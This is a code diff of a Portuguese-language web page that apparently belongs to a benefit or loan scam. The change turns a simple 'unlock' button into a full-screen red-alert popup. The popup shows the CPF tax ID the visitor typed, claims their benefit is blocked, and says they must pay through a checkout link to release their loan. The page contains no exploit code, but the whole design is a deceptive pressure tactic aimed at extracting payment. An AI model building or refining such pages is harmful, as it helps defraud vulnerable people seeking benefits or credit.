@@ -7,55 +7,96 @@
     <link rel="stylesheet" href="styles.css">
     
     <style>
-        /* Garante que o container do botão flutue na parte inferior */
+        /* Fundo escuro que cobre a tela inteira */
         .unlock-button-container {
-            position: fixed; /* Fixa na tela */
-            bottom: 0;       /* Cola no chão */
+            position: fixed;
+            top: 0;
             left: 0;
-            width: 100%;     /* Ocupa toda a largura */
-            background-color: #ffffff; /* Fundo branco para destacar */
-            box-shadow: 0 -4px 10px rgba(0,0,0,0.1); /* Sombra elegante para separar do conteúdo */
-            padding: 15px;   /* Espaço interno */
-            box-sizing: border-box; /* Garante que o padding não estoure a largura */
-            z-index: 9999;   /* Garante que fique por cima de tudo */
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85); /* Fundo bem escuro para foco total */
+            z-index: 99999;
             display: flex;
-            justify-content: center; /* Centraliza o botão */
-            
-            /* Animação suave quando aparecer */
-            transition: transform 0.3s ease-in-out;
+            justify-content: center; /* Centraliza horizontalmente */
+            align-items: center;     /* Centraliza verticalmente */
+            padding: 20px;
+            box-sizing: border-box;
+            backdrop-filter: blur(5px); /* Efeito de desfoque no fundo (opcional, fica moderno) */
         }
 
-        /* Estilo para garantir que o botão seja grande e clicável no mobile */
-        .btn-unlock {
+        /* A caixa branca do popup */
+        .modal-content {
+            background: white;
+            padding: 30px 25px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
             width: 100%;
-            max-width: 400px; /* Não deixa ficar gigante em telas de PC */
-            padding: 15px 0;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            animation: popupIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); /* Efeito de "pulo" ao abrir */
+            border-top: 5px solid #d32f2f; /* Tarja vermelha no topo para alerta */
+        }
+
+        /* Animação de entrada */
+        @keyframes popupIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Título do Popup */
+        .modal-title {
+            color: #d32f2f;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 0 15px 0;
+            text-transform: uppercase;
+        }
+
+        /* Texto do CPF */
+        .modal-cpf {
             font-size: 18px;
             font-weight: bold;
+            color: #333;
+            background-color: #f5f5f5;
+            padding: 8px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px dashed #999;
+        }
+
+        /* Texto de aviso */
+        .modal-text {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* O Botão de Desbloqueio */
+        .btn-unlock {
+            width: 100%;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
             border-radius: 8px;
-            text-decoration: none; /* Remove sublinhado de link */
+            text-decoration: none;
             display: block;
             text-align: center;
-            /* Mantém as cores originais ou define padrão se não houver */
-            background-color: #28a745; 
+            background: linear-gradient(to bottom, #28a745, #218838); /* Verde degradê */
             color: white;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 0 #1e7e34; /* Efeito 3D no botão */
+            transition: transform 0.1s;
         }
         
-        /* Efeito de clique */
         .btn-unlock:active {
-            transform: scale(0.98);
+            transform: translateY(4px); /* Botão afunda ao clicar */
+            box-shadow: 0 0 0 #1e7e34;
         }
 
-        /* Se a classe 'hidden' usar display: none, o botão some corretamente.
-           Se o seu CSS usar outra técnica, isso garante que suma. */
         .hidden {
             display: none !important;
-        }
-
-        /* Adiciona um espaço no final da página para o conteúdo não ficar atrás do botão */
-        body {
-            padding-bottom: 100px; /* Espaço extra no final do scroll */
         }
     </style>
 </head>
@@ -143,12 +184,36 @@
                 <div id="result" class="result hidden"></div>
                 
                 <div id="unlockButtonContainer" class="unlock-button-container hidden">
-                    <a href="https://go.perfectpay.com.br/PPU38CQ6BSS" id="unlockLink" class="btn-unlock">🔓 Desbloquear Agora</a>
+                    <div class="modal-content">
+                        <h2 class="modal-title">🔒 BENEFÍCIO BLOQUEADO</h2>
+                        
+                        <div class="modal-cpf">CPF: <span id="displayCpf">...</span></div>
+                        
+                        <p class="modal-text">
+                            Seu benefício está bloqueado e precisa ser desbloqueado para liberar o pagamento e receber seu empréstimo.
+                        </p>
+                        
+                        <a href="https://go.perfectpay.com.br/PPU38CQ6BSS" id="unlockLink" class="btn-unlock">
+                            🔓 Desbloquear Agora
+                        </a>
+                    </div>
                 </div>
             </div>
         </main>
     </div>
 
     <script src="script.js"></script>
+
+    <script>
+        document.getElementById('cpfForm').addEventListener('submit', function(e) {
+            // Pequeno atraso para garantir que o script principal rode primeiro
+            setTimeout(function() {
+                var cpfDigitado = document.getElementById('cpfInput').value;
+                if(cpfDigitado) {
+                    document.getElementById('displayCpf').innerText = cpfDigitado;
+                }
+            }, 100);
+        });
+    </script>
 </body>
 </html>
